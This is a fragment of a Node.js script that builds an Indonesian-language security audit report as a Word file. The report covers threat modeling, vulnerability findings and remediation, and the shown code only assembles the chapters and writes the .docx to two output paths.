                    text: 'Copyright © 2026 by Rayhan Pratama & Dr. Erliyan Redy Susanto, M.Kom. — Universitas Teknokrat Indonesia & Pemkot BDL',
                    size: 16, color: C.textMuted, font: 'Calibri'
                  }),
                ],
              }),
            ],
          }),
        },
        children: [
          ...buildCoverPage(),
          ...buildRingkasanEksekutif(),
          ...buildBab1_Pendahuluan(),
          ...buildBab2_MetodologiThreatModeling(),
          ...buildBab3_TemuanKerentanan(),
          ...buildBab4_BlueprintRemediasi(),
          ...buildBab5_MatriksKepatuhanRegulasi(),
          ...buildBab6_KesimpulanRekomendasi(),
        ],
      },
    ],
  });

  const buffer = await Packer.toBuffer(doc);

  const outDir = path.join(__dirname, '..');
  const outPath1 = path.join(outDir, 'Laporan_Audit_Keamanan_SIAP_LAPOR_Rayhan_Pratama.docx');
  const outPath2 = path.join(__dirname, 'Laporan_Audit_Keamanan_SIAP_LAPOR_Rayhan_Pratama.docx');

  const sizeKB = Math.round(buffer.byteLength / 1024);
  console.log(`✅ Berkas docx audit keamanan berhasil diproses (${sizeKB} KB)!`);

  try {
    fs.writeFileSync(outPath1, buffer);
    console.log(`   📄 Output 1: ${outPath1}`);
  } catch (err) {
    console.warn(`   ⚠️ Berkas Output 1 sedang dibuka di Word (kunci aktif).`);
  }

  try {
    fs.writeFileSync(outPath2, buffer);
    console.log(`   📄 Output 2: ${outPath2}`);
  } catch (err) {
    console.warn(`   ⚠️ Berkas Output 2 sedang dibuka di aplikasi lain.`);
  }
}

main().catch(err => {
  console.error('❌ Gagal menghasilkan dokumen:', err);
  process.exit(1);
});
